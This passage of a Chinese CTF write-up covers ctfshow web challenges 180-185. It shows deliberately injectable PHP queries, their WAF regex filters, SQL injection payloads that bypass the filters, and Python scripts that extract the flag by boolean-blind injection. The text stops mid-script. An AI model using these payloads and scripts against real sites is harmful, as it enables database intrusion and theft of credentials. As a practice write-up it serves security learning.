<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">法一：
-1'or(id=26)and'1'='1'--%0c
法二：
1'%0cor%0c1=1%0c--%0c
</code></pre>
<h4 id="web-181-过滤注入-运算级andor"><a class="anchor" href="#web-181-过滤注入-运算级andor">#</a> web 181 过滤注入 运算级 and&gt;or</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>bypass</p>
<pre><code class="language-xml-dtd">'1'='1来替代了%23   或者--%0c代替%23
</code></pre>
<p>payload</p>
<pre><code class="language-xml-dtd">法一：
-1'or(id=26)and'1'='1
法二：
-1'or(id=26)and'1'='1'--%0c
</code></pre>
<h4 id="web-182-过滤注入-运算级andor"><a class="anchor" href="#web-182-过滤注入-运算级andor">#</a> web 182 过滤注入 运算级 and&gt;or</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">-1'or(id=26)and'1'='1'--%0c
</code></pre>
<h4 id="web-183-过滤注入-布尔盲注"><a class="anchor" href="#web-183-过滤注入-布尔盲注">#</a> web 183 过滤注入 - 布尔盲注</h4>
<pre><code class="language-xml-dtd">count(expr)：返回SELECT语句检索到的行中非NULL值的数目。
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(pass) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token comment">// 空格过滤了</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>查询结果</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>测试结果</p>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152549563.png" alt="image-20220506152549563" /></p>
<p>payload</p>
<pre><code class="language-xml-dtd">tableName=(ctfshow_user)where(substr(pass,1,&#123;&#125;))like'&#123;&#125;'
</code></pre>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：demo.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/25 17:22</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">#payload:tableName=(ctfshow_user)where(substr(pass,1,&#123;&#125;))like'&#123;&#125;'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://0824bedf-0332-487c-944e-a79aabc377af.challenge.ctf.show/select-waf.php"</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"(ctfshow_user)where(substr(pass,1,&#123;0&#125;))like'&#123;1&#125;'"</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>strings <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span><span class="token string">'-&#123;&#125;'</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strings<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><h4 id="web-184-过滤注入-布尔盲注-where过滤"><a class="anchor" href="#web-184-过滤注入-布尔盲注-where过滤">#</a> web 184 过滤注入 - 布尔盲注 - where 过滤</h4>
<pre><code class="language-xml-dtd">ord将字符串转换为数字
char里面加数字，在mysql里面会返回16进制数
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>查询结果</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">tableName=ctfshow_user as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(99))
</code></pre>
<p><img data-src="../../../systemdefault/%25E5%259B%25BE%25E7%2589%2587/CTF/image-20220506152607073.png" alt="image-20220506152607073" /></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：demo.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/25 17:22</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#payload:tableName=ctfshow_user as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(99))</span></pre></td></tr><tr><td data-num="9"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://68bf4a9d-00d8-4b3b-a66f-476bab72119d.challenge.ctf.show/select-waf.php"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;0&#125;,1)regexp(char(&#123;1&#125;))"</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token comment">#char 里面加数字，在 mysql 里面会返回 16 进制数</span></pre></td></tr><tr><td data-num="12"></td><td><pre>strings <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"-&#123;&#125;"</span></pre></td></tr><tr><td data-num="13"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strings<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ord 将字符串转换为数字</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="23"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><h4 id="web-185-过滤注入-布尔盲注-够造数字"><a class="anchor" href="#web-185-过滤注入-布尔盲注-够造数字">#</a> web 185 过滤注入 - 布尔盲注 - 够造数字</h4>
<pre><code class="language-xml-dtd">利用true构造数字
</code></pre>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>查询语句</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select count(*) from "</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tableName'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>返回逻辑</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>查询结果</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 返回用户表的记录总数</span></pre></td></tr><tr><td data-num="11"></td><td><pre>      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>payload</p>
<pre><code class="language-xml-dtd">tableName=ctfshow_user as a right join ctfshow_user as b on substr(b.pass,1,1)regexp(char(&#123;&#125;))
</code></pre>
<p>right join 方法</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://d6f86f47-cebb-43bd-99d5-5906fc884ab7.challenge.ctf.show/select-waf.php"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,&#123;&#125;)regexp(char(&#123;&#125;))"</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>strings <span class="token operator">=</span> string<span class="token punctuation">.</span>digits<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span><span class="token string">"-&#123;&#125;"</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    num <span class="token operator">=</span> <span class="token string">'true'</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">'true'</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            num <span class="token operator">+=</span> <span class="token string">'+true'</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">return</span> num</pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token comment">#print(createNum(99))</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strings<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>createNum<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>createNum<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>createNum<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>            flag <span class="token operator">+=</span> j</pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">if</span> <span class="token string">"&#125;"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                exit<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>            <span class="token keyword">break</span></pre></td></tr></table></figure><p>group by 方法</p>
<p>payload</p>
<pre><code class="language-xml-dtd">tableName=ctfshow_user group by pass having pass like concat(&#123;&#125;)
</code></pre>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：demo.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/25 17:22</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>url <span class="token operator">=</span> <span class="token string">"http://d6f86f47-cebb-43bd-99d5-5906fc884ab7.challenge.ctf.show/select-waf.php"</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">"ctfshow_user group by pass having pass like concat(&#123;&#125;)"</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>strings <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits <span class="token operator">+</span> <span class="token string">"-&#123;&#125;"</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">"ctfshow&#123;"</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    num <span class="token operator">=</span> <span class="token string">'true'</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">'true'</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>            num <span class="token operator">+=</span> <span class="token string">'+true'</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">return</span> num</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">def</span> <span class="token function">createstrNum</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> m<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token builtin">str</span> <span class="token operator">+=</span> <span class="token string">",chr("</span> <span class="token operator">+</span>createNum<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>  <span class="token string">")"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> strings<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            <span class="token string">"tableName"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>createstrNum<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span> <span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span 